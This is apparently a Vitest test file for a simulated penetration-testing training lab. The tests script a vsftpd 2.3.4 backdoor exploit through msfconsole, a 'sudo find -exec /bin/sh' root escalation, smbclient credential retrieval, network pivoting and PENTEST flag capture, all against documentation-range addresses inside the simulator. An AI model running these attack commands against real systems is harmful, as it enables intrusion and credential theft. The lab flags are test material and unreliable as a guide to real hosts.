import { describe, expect, it } from "vitest";
import { netRangeScenarioSchema } from "@/lib/lab-engine/netrange/schema";
import { lintNetRangeScenario } from "@/lib/lab-engine/netrange/lint";
import {
  createInitialNetRangeState,
  execNetRangeCommand,
} from "@/lib/lab-engine/netrange/engine";
import { parseArgv } from "@/lib/lab-engine/netrange/commands/util";
import { netrangeFootholdPrivesc } from "@/lib/generators/netrange/netrange-foothold-privesc";
import { netrangeWebCredReuse } from "@/lib/generators/netrange/netrange-web-cred-reuse";
import { netrangePivotInternal } from "@/lib/generators/netrange/netrange-pivot-internal";
import { createRng } from "@/lib/generators/rng";
import type { NetRangeScenario } from "@/lib/lab-engine/netrange/types";

describe("NetRange Engine & Command Simulator", () => {
  const rng = createRng("netrange-unit-test-seed-01");
  const footholdLab = netrangeFootholdPrivesc(rng, {});
  const footholdScenario = (footholdLab.env as { network: { scenario: NetRangeScenario } }).network.scenario;

  describe("1. Schema & Lint Validation", () => {
    it("validates scenario schema correctly", () => {
      const parsed = netRangeScenarioSchema.safeParse(footholdScenario);
      expect(parsed.success).toBe(true);
    });

    it("detects invalid IP format in schema", () => {
      const badScenario = {
        ...footholdScenario,
        hosts: [
          {
            ...footholdScenario.hosts[0],
            interfaces: [{ ip: "999.888.777.666", subnet: "192.0.2.0/24" }],
          },
        ],
      };
      const parsed = netRangeScenarioSchema.safeParse(badScenario);
      expect(parsed.success).toBe(false);
    });

    it("lints RFC documentation IP ranges and reachability", () => {
      const lintResult = lintNetRangeScenario(footholdScenario);
      expect(lintResult.valid).toBe(true);
      expect(lintResult.errors).toEqual([]);
    });

    it("parses complex quoted argument vectors", () => {
      const argv = parseArgv('nmap -sV -p 21,22 "192.0.2.50" --script "banner,default"');
      expect(argv).toEqual(["nmap", "-sV", "-p", "21,22", "192.0.2.50", "--script", "banner,default"]);
    });
  });

  describe("2. Reconnaissance & Enumeration Commands", () => {
    it("nmap scans ports and identifies open services and versions", () => {
      const state = createInitialNetRangeState(footholdScenario);
      const res = execNetRangeCommand("nmap -sV 192.0.2.50", state, footholdScenario);

      expect(res.code).toBe(0);
      expect(res.stdout).toContain("21/tcp");
      expect(res.stdout).toContain("vsftpd 2.3.4");
      expect(res.stdout).toContain("22/tcp");
      expect(res.stdout).toContain("OpenSSH");
      expect(res.stdout).toContain("80/tcp");
    });

    it("searchsploit locates exploits matching software versions", () => {
      const state = createInitialNetRangeState(footholdScenario);
      const res = execNetRangeCommand("searchsploit vsftpd 2.3.4", state, footholdScenario);

      expect(res.code).toBe(0);
      expect(res.stdout).toContain("vsftpd 2.3.4 - Backdoor Command Execution");
      expect(res.stdout).toContain("unix/remote/17491.rb");
    });

    it("curl queries HTTP endpoints and handles missing routes", () => {
      const state = createInitialNetRangeState(footholdScenario);
      const res = execNetRangeCommand("curl -i http://192.0.2.50/", state, footholdScenario);

      expect(res.code).toBe(0);
      expect(res.stdout).toContain("HTTP/1.1 200 OK");
      expect(res.stdout).toContain("Apex Systems Portal");

      const notFound = execNetRangeCommand("curl -i http://192.0.2.50/nonexistent", state, footholdScenario);
      expect(notFound.stdout).toContain("404 Not Found");
    });

    it("unknown commands produce realistic bash errors", () => {
      const state = createInitialNetRangeState(footholdScenario);
      const res = execNetRangeCommand("hydra -l admin -P pass.txt 192.0.2.50 ssh", state, footholdScenario);

      expect(res.code).toBe(127);
      expect(res.stderr).toContain("bash: hydra: command not found");
    });
  });

  describe("3. Metasploit Exploitation & Host Session Management", () => {
    it("interacts with msfconsole and triggers backdoor exploit", () => {
      let state = createInitialNetRangeState(footholdScenario);

      // Launch msfconsole
      let res = execNetRangeCommand("msfconsole", state, footholdScenario);
      expect(res.stdout).toContain("metasploit v6.3.4-dev");
      state = res.nextState;

      // Select exploit
      res = execNetRangeCommand("use exploit/unix/ftp/vsftpd_234_backdoor", state, footholdScenario);
      expect(res.stdout).toContain("Using exploit/unix/ftp/vsftpd_234_backdoor");
      state = res.nextState;

      // Set target
      res = execNetRangeCommand("set RHOSTS 192.0.2.50", state, footholdScenario);
      expect(res.stdout).toContain("RHOSTS => 192.0.2.50");
      state = res.nextState;

      // Exploit!
      res = execNetRangeCommand("exploit", state, footholdScenario);
      expect(res.stdout).toContain("Backdoor service spawned!");
      expect(res.stdout).toContain("Command shell session 1 opened");
      state = res.nextState;

      // State is now interactive on remote host
      expect(state.currentHostId).toBe("apex-srv01");
      expect(state.currentUser).toBe("operator");
      expect(state.sessions.length).toBe(1);

      // Execute commands on compromised host
      const whoami = execNetRangeCommand("whoami", state, footholdScenario);
      expect(whoami.stdout.trim()).toBe("operator");

      const catFlag = execNetRangeCommand("cat /home/operator/flag.txt", state, footholdScenario);
      expect(catFlag.stdout).toContain("PENTEST{foothold_");
    });

    it("escalates privileges via sudo GTFOBins breakout", () => {
      const state = createInitialNetRangeState(footholdScenario, {
        currentHostId: "apex-srv01",
        currentUser: "operator",
        currentCwd: "/home/operator",
      });

      // Check sudo permissions
      const sudoL = execNetRangeCommand("sudo -l", state, footholdScenario);
      expect(sudoL.stdout).toContain("NOPASSWD: /usr/bin/find");

      // Execute GTFOBins breakout
      const privesc = execNetRangeCommand("sudo find . -exec /bin/sh \\;", state, footholdScenario);
      expect(privesc.stdout).toContain("Spawning root shell");
      expect(privesc.nextState.currentUser).toBe("root");
      expect(privesc.prompt).toContain("root@apex-srv01:/root#");

      // Read root flag
      const catRoot = execNetRangeCommand("cat /root/flag.txt", privesc.nextState, footholdScenario);
      expect(catRoot.stdout).toContain("PENTEST{root_privesc_");
    });
  });

  describe("4. Lateral Movement & Network Pivoting", () => {
    const pivotLab = netrangePivotInternal(rng, {});
    const pivotScenario = (pivotLab.env as { network: { scenario: NetRangeScenario } }).network.scenario;

    it("blocks access to internal subnet prior to routing configuration", () => {
      const state = createInitialNetRangeState(pivotScenario);
      const ping = execNetRangeCommand("ping 172.16.50.25", state, pivotScenario);

      expect(ping.code).toBe(1);
      expect(ping.stdout).toContain("Destination Host Unreachable");
    });

    it("smbclient enumerates public share and reveals credentials", () => {
      const state = createInitialNetRangeState(pivotScenario);
      const listShares = execNetRangeCommand("smbclient -L //192.0.2.100", state, pivotScenario);

      expect(listShares.code).toBe(0);
      expect(listShares.stdout).toContain("public");

      const getCreds = execNetRangeCommand("smbclient //192.0.2.100/public -c 'get creds.txt'", state, pivotScenario);
      expect(getCreds.stdout).toContain("getting file \\creds.txt");
      expect(getCreds.nextState.downloadedFiles["creds.txt"]).toContain("pivotuser");
    });

    it("adds route and accesses internal subnet host", () => {
      let state = createInitialNetRangeState(pivotScenario);
      // Gateway must be compromised first
      state = execNetRangeCommand("smbclient //192.0.2.100/public -c 'get creds.txt'", state, pivotScenario).nextState;

      const addRoute = execNetRangeCommand("route add 172.16.50.0/24 via 192.0.2.100", state, pivotScenario);
      expect(addRoute.code).toBe(0);
      expect(addRoute.stdout).toContain("Route added for 172.16.50.0/24 via 192.0.2.100");
      state = addRoute.nextState;

      expect(state.routes).toContain("172.16.50.0/24");

      // Curl now succeeds
      const curlInternal = execNetRangeCommand("curl -i http://172.16.50.25:8080/api/crown_jewel", state, pivotScenario);
      expect(curlInternal.code).toBe(0);
      expect(curlInternal.stdout).toContain("TOP_SECRET");
      expect(curlInternal.stdout).toContain("PENTEST{internal_crown_");
    });
  });

  describe("5. Determinism & Performance Gates", () => {
    it("generates deterministic flags for same seed across all scenarios", () => {
      const seed = "static-seed-9999";
      const a1 = netrangeFootholdPrivesc(createRng(seed), {});
      const a2 = netrangeFootholdPrivesc(createRng(seed), {});
      expect(a1.answers).toEqual(a2.answers);

      const b1 = netrangeWebCredReuse(createRng(seed), {});
      const b2 = netrangeWebCredReuse(createRng(seed), {});
      expect(b1.answers).toEqual(b2.answers);

      const c1 = netrangePivotInternal(createRng(seed), {});
      const c2 = netrangePivotInternal(createRng(seed), {});
      expect(c1.answers).toEqual(c2.answers);
    });

    it("executes all commands well within the 150ms performance threshold", () => {
      const state = createInitialNetRangeState(footholdScenario);
      const testCommands = [
        "nmap 192.0.2.50",
        "searchsploit vsftpd",
        "curl http://192.0.2.50/",
        "route -n",
        "help",
      ];

      for (const cmd of testCommands) {
        const start = performance.now();
        const res = execNetRangeCommand(cmd, state, footholdScenario);
        const elapsed = performance.now() - start;

        expect(elapsed).toBeLessThan(150);
        expect(res.code).toBe(0);
      }
    });

    it("properly parses submit flag command", () => {
      const state = createInitialNetRangeState(footholdScenario);
      const res = execNetRangeCommand("submit 1 PENTEST{foothold_12345678}", state, footholdScenario);

      expect(res.code).toBe(0);
      expect(res.submit).toEqual({ objective: 1, answer: "PENTEST{foothold_12345678}" });
    });
  });
});
